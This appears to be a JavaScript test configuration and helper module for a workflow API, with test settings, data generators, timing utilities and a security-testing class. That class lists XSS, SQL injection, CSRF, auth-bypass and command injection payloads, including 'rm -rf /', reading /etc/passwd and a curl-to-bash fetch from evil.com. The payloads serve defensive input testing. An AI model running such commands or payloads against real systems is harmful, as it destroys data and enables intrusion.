/**
 * 测试配置文件
 * 统一管理测试环境配置、模拟数据和测试工具
 */

export const TEST_CONFIG = {
  // 测试环境设置
  environment: {
    NODE_ENV: 'test',
    LOG_LEVEL: 'error', // 只显示错误日志
    TEST_TIMEOUT: 10000,
    SLOW_TEST_TIMEOUT: 30000,
  },

  // API配置
  api: {
    baseURL: 'https://api.workflow.test',
    timeout: 5000,
    retries: 2,
  },

  // 认证配置
  auth: {
    secret: 'test-jwt-secret-key-for-frys-testing',
    issuer: 'frys-test-suite',
    audience: 'frys-api',
    expiresIn: '1h',
  },

  // 数据库配置（模拟）
  database: {
    host: 'localhost',
    port: 5432,
    database: 'frys_test',
    username: 'test_user',
    password: 'test_password',
  },

  // 消息队列配置（模拟）
  messaging: {
    cluster: 'test-cluster',
    servers: ['nats://localhost:4222'],
    timeout: 5000,
  },

  // 缓存配置
  cache: {
    ttl: 300, // 5分钟
    maxSize: 1000,
  },

  // 安全测试配置
  security: {
    maxLoginAttempts: 5,
    lockoutDuration: 15 * 60 * 1000, // 15分钟
    passwordMinLength: 8,
    tokenBlacklistTtl: 24 * 60 * 60 * 1000, // 24小时
  },

  // 性能测试配置
  performance: {
    sampleSize: 1000,
    warmupIterations: 100,
    maxExecutionTime: 100, // 毫秒
    memoryThreshold: 50 * 1024 * 1024, // 50MB
  },
};

// 测试数据生成器
export class TestDataGenerator {
  static generateUser(overrides = {}) {
    return {
      id: TestDataGenerator.generateId(),
      username: `user_${TestDataGenerator.generateId()}`,
      email: `user${TestDataGenerator.generateId()}@test.com`,
      role: 'user',
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static generateTask(overrides = {}) {
    return {
      id: TestDataGenerator.generateId(),
      title: `Task ${TestDataGenerator.generateId()}`,
      description: `Description for task ${TestDataGenerator.generateId()}`,
      status: 'pending',
      priority: 'medium',
      assigneeId: TestDataGenerator.generateId(),
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static generateWorkflow(overrides = {}) {
    return {
      id: TestDataGenerator.generateId(),
      name: `Workflow ${TestDataGenerator.generateId()}`,
      description: `Workflow description ${TestDataGenerator.generateId()}`,
      status: 'active',
      steps: [],
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static generateId() {
    return Math.random().toString(36).substr(2, 9);
  }

  static generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  static generateRandomString(length = 10) {
    const chars =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  static generateEmail(domain = 'test.com') {
    return `${TestDataGenerator.generateRandomString(8)}@${domain}`;
  }

  static generatePhoneNumber() {
    return `+1${Math.floor(Math.random() * 9000000000) + 1000000000}`;
  }

  static generateDate(future = false, days = 0) {
    const date = new Date();
    if (future) {
      date.setDate(date.getDate() + days);
    } else {
      date.setDate(date.getDate() - days);
    }
    return date;
  }
}

// 测试工具类
export class TestUtils {
  static async wait(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  static async retry(fn, maxRetries = 3, delay = 1000) {
    let lastError;
    for (let i = 0; i < maxRetries; i++) {
      try {
        return await fn();
      } catch (error) {
        lastError = error;
        if (i < maxRetries - 1) {
          await TestUtils.wait(delay * (i + 1)); // 指数退避
        }
      }
    }
    throw lastError;
  }

  static createMockResponse(data, status = 200, headers = {}) {
    return {
      data,
      status,
      statusText: status === 200 ? 'OK' : 'Error',
      headers: {
        'content-type': 'application/json',
        ...headers,
      },
      config: {},
    };
  }

  static createMockError(message, status = 500, code = 'INTERNAL_ERROR') {
    const error = new Error(message);
    error.response = {
      data: { error: code, message },
      status,
      statusText: 'Internal Server Error',
      headers: { 'content-type': 'application/json' },
    };
    error.code = code;
    return error;
  }

  static measureExecutionTime(fn) {
    const start = process.hrtime.bigint();
    const result = fn();
    const end = process.hrtime.bigint();
    const executionTime = Number(end - start) / 1e6; // 转换为毫秒
    return { result, executionTime };
  }

  static async measureAsyncExecutionTime(fn) {
    const start = process.hrtime.bigint();
    const result = await fn();
    const end = process.hrtime.bigint();
    const executionTime = Number(end - start) / 1e6; // 转换为毫秒
    return { result, executionTime };
  }

  static calculateMemoryUsage() {
    const usage = process.memoryUsage();
    return {
      rss: Math.round((usage.rss / 1024 / 1024) * 100) / 100, // MB
      heapUsed: Math.round((usage.heapUsed / 1024 / 1024) * 100) / 100, // MB
      heapTotal: Math.round((usage.heapTotal / 1024 / 1024) * 100) / 100, // MB
      external: Math.round((usage.external / 1024 / 1024) * 100) / 100, // MB
    };
  }

  static assertPerformance(executionTime, maxTime, label = 'operation') {
    if (executionTime > maxTime) {
      throw new Error(`${label} 性能不达标: ${executionTime}ms > ${maxTime}ms`);
    }
  }

  static assertMemoryUsage(maxHeapUsed, label = 'operation') {
    const memory = TestUtils.calculateMemoryUsage();
    if (memory.heapUsed > maxHeapUsed) {
      throw new Error(
        `${label} 内存使用过高: ${memory.heapUsed}MB > ${maxHeapUsed}MB`,
      );
    }
  }
}

// 安全测试工具
export class SecurityTestUtils {
  static generateXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="javascript:alert(\'XSS\')"></object>',
    ];
  }

  static generateSQLInjectionPayloads() {
    return [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin' --",
      "' OR 1=1 --",
      "'; EXEC xp_cmdshell 'net user'; --",
    ];
  }

  static generateCommandInjectionPayloads() {
    return [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& echo "hacked"',
      '`whoami`',
      '$(rm -rf /)',
      '; curl http://evil.com/malware.sh | bash',
    ];
  }

  static generateCSRFPayloads() {
    return [
      {
        method: 'POST',
        url: '/api/users/1/delete',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'confirm=true',
      },
      {
        method: 'PUT',
        url: '/api/users/1/email',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'hacker@evil.com' }),
      },
    ];
  }

  static generateAuthBypassPayloads() {
    return [
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: '' },
      { username: '', password: 'admin' },
      { username: "admin' OR '1'='1", password: 'anything' },
      { username: 'admin', password: "admin' --" },
      { token: 'invalid.jwt.token' },
      { token: '' },
      { token: null },
    ];
  }

  static fuzzStrings(length = 100, count = 50) {
    const fuzzStrings = [];
    const chars =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';

    for (let i = 0; i < count; i++) {
      let str = '';
      const strLength = Math.floor(Math.random() * length) + 1;
      for (let j = 0; j < strLength; j++) {
        str += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      fuzzStrings.push(str);
    }

    return fuzzStrings;
  }
}
